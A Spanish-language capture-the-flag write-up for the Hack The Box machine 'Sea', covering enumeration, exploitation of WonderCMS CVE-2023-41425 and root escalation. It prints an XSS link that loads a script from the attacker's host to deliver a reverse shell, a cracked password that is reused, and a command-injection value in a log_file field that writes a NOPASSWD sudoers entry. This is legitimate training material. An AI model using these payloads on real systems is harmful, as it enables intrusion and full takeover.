---
title: Sea - Hack The Box
date: 2024-12-02
description: Maquina Sea (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/sea/
image: sea.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.28 -oG allPorts
```

Puertos abiertos: 22 y 80

## Análisis

```bash
nmap -sCV -p22,80 10.10.11.23 -oN targeted

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

El puerto 80 da acceso a la web de http://sea.htb, sin nada destacable.

Whatweb tampoco añade mayor información:
```bash
whatweb http://sea.htb

http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.28], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
```

Enumerando con nmap se ven los siguientes directorios sin información relevante:
```bash
nmap --script http-enum -p80 10.10.11.28 -oN webScan
80/tcp open  http
| http-enum: 
|_  /home/: Potentially interesting folder
```

Enumerando directorios con wfuzz se ven los siguientes directorios:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000182:   301        7 L      20 W       228 Ch      "data"                                                                                         
000000519:   301        7 L      20 W       231 Ch      "plugins"                                                                                      
000000955:   301        7 L      20 W       232 Ch      "messages"                                                                                     
000000124:   200        86 L     262 W      3649 Ch     "0"                                                                                            
000000127:   301        7 L      20 W       230 Ch      "themes"                                                                                        
000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         

```

Directorio /data:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/data/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000000094:   301        7 L      20 W       234 Ch      "files"                                                                                        
000000038:   200        86 L     262 W      3649 Ch     "home"    
```

Directorio /data/files:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/data/files/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"   
```

Directorio /plugins:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/plugins/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"   
```

Directorio /messages:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/messages/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"     
```

Directorio /themes:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/themes/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000007875:   301        7 L      20 W       235 Ch      "bike"  
```

Directorio /themes/bike:
```bash
wfuzz -c --hc=403,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://sea.htb/themes/bike/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000252:   200        1 L      1 W        6 Ch        "version"                                                                                      
000000039:   301        7 L      20 W       239 Ch      "img"                                                                                          
000000038:   200        86 L     262 W      3649 Ch     "home"                                                                                         
000000550:   301        7 L      20 W       239 Ch      "css"                                                                                          
000000965:   200        1 L      9 W        66 Ch       "summary"                                                                                      
000001559:   200        84 L     209 W      3340 Ch     "404"                                                                                          
000003295:   200        21 L     168 W      1067 Ch     "LICENSE"   
```

El directorio "http://sea.htb/themes/bike/version" muestra la versión "3.2.0" de un sistema.

El directorio "http://sea.htb/themes/bike/LICENSE" muestra la MIT License de "turboblack".

Una busqueda de "turboblack" y el theme "bike", devuelve el CMS ["Wonder"](https://github.com/turboblack/wondercms_theme).

Buscando por vulnerabilidades para Wonder CMS en versión 3.2.0 devuelve el [CVE-2023-41425](https://github.com/insomnia-jacob/CVE-2023-41425).


## Explotación

El exploit utiliza XSS para lanzar una RCE. Al ejecutar el exploit, este genera un servidor web que se queda a la escucha del puerto 8000 y entregará a la maquina victima el fichero "main.zip" que contiene la reverse shell.

En los parametros del exploit se pasa el puerto donde se dejará a la escucha netcat (443):

```bash
./exploit.py -u http://sea.htb/loginURL -i 10.10.14.160 -p 443 -r http://10.10.14.160:8000/main.zip
 
================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================          
 
[+]The zip file will be downloaded from the host:    http://10.10.14.160:8000/main.zip
 
[+] File created:  xss.js
 
[+] Set up nc to listen on your terminal for the reverse shell
	Use:
		  nc -nvlp 443 
 
[+] Send the below link to admin:

	http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.160:8000/xss.js"></script><form+action=" 

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

El exploit genera una URL que se introducirá en el campo "Website" de la página de "http://sea.htb/contact.php".

Tras el submit, se obtiene acceso a la maquina con el usuario www-data.

## Escalada

### User

Listando los archivos y directorios de la carpeta "/var/www/sea" se observa la carpeta "data":

```bash
$ cd /var/www/sea
$ ls
contact.php
data
index.php
messages
plugins
themes
```

Listando los archivos y directorios de la carpeta "data" se obsera el fichero "database.js":

```bash
$ cd data
$ ls
cache.json
database.js
files
```

Este fichero contiene información de la configuración web, incluida una contraseña encriptada:

```bash
$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/12\/13 19:30:34": "127.0.0.1",
            "2024\/12\/13 19:29:04": "127.0.0.1",
            "2024\/12\/13 19:27:34": "127.0.0.1",
            "2024\/12\/13 19:25:04": "127.0.0.1",
            "2024\/12\/13 19:22:34": "127.0.0.1"
        },
...
```

Al desencriptar la contraseña por fuerza bruta con John The Ripper se obtiene la contraseña en texto claro "mychemicalromance":

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)     
1g 0:00:00:37 DONE (2024-12-13 20:35) 0.02686g/s 82.21p/s 82.21c/s 82.21C/s midnight1..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Listando los usuarios del sistema se observan los usuarios "amay" y "geo":

```bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
geo:x:1001:1001::/home/geo:/bin/bash
```

Al intentar la conexión por SSH al usuario "amay" reutilizando la contraseña obtenida de "database.js" se obtiene acceso al equipo con usuario amay y la flag de "user.txt".

```bash
$ su amay
Password: mychemicalromance
whoami
amay
```

### Root

Listando directorios no se encuentra nada relevante.

Listando los puertos abiertos se observa el puerto 8080 abierto para localhost:

```bash
amay@sea:/opt/google/chrome$ netstat -putona
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
```

Para atacar el puerto se crea un port forwarding, llevando el puerto de la maquina Sea al equipo local:

```bash
ssh -v -N -L 8080:localhost:8080 amay@sea.htb
```

Al atacar el puerto local 8080 se observa que se trata de una web de un sistema de monitorización:

<!-- ![System Monitor](system_monitor.png) -->

Capturando con burpsuit la petición de "Analyze" se observa que se pasa el nombre del fichero en "log_file":

```bash
POST / HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 57
Cache-Control: max-age=0
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: es-ES,es;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

Se testea pasar otros ficheros como "/etc/passwd" y funciona:

<!-- ![/etc/passwd](etc_passwd.png) -->

Se testea a concatenar comandos con "+" en bash y funciona, por lo que se procede a modificar los permisos del usuario "amay" para darle permisos de "sudo":

```bash
log_file=/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#&analyze_log=
```

Lo cual funciona y permite acceder como root con acceso a la flag de root.

```bash
amay@sea:~$ sudo su
root@sea:/home/amay#
```